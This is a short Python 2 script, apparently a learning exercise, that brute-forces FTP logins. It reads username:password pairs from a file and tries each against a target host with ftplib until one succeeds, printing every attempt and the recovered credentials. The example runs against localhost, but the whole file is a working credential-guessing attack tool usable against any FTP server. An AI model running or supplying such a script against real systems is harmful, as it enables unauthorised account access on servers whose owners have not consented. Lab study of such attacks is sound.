# _*_coding:utf8-

import ftplib

'''
This code, we learning how to login target computer's FTP and use hostname,password.
Note:
-----
    1. Remember change anonymous = Yes tp No in your /etc/vsftpd.conf
    
    
'''


def bruteLogin(hostname, passFile):
    '''
     :param hostname: target hostname,this example we use '127.0.0.1'
    :param passFile: password in  password file ---"userpass.txt"

    Docstring:
    ---------
        1.First, we use for loop to "userpass.txt" file,and the,
         we use split function get userName and password
        2. Next, we Trying login to FTP and  using userName and password
            if Succeeded, return userName  and password in tuple. and print Succeeded
            else, return None
        3. when this for loop is "OK", we still not found userName and password,then
            we print have not found.
    '''
    pF = open(passFile, 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print '[+] Trying: ' + userName + '/' + passWord
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print '[*]' + str(hostname) + ' FTP Logon Succeeded: ' + userName + '/' + passWord
            ftp.quit()
            return (userName, passWord)

        except Exception as e:
            pass
    print '[-] Could not FTP brute force FTP credentials. '
    return None


if __name__ == '__main__':
    host = '127.0.0.1'
    passwdFile = 'userpass.txt'
    bruteLogin(host, passwdFile)
